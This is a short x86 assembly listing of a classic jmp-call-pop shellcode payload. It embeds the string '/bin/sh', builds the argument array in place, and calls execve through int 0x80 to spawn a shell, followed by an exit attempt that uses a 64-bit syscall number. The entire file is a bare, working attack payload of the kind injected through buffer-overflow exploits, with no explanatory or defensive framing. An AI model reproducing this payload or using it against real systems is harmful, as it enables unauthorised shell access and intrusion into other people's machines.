section .text
global _start
    _start:
        jmp _payload_db
    _payload:
        xor eax, eax
        pop ebx
        mov [ebx+7], al
        mov [ebx+8], ebx
        mov [ebx+12], eax
        lea ecx, [ebx+8]
        lea edx, [ebx+12]
        mov al,11
        int 0x80
        mov al,60
        int 0x80
    _payload_db:
        call _payload
        db "/bin/shIJJJJKKKK"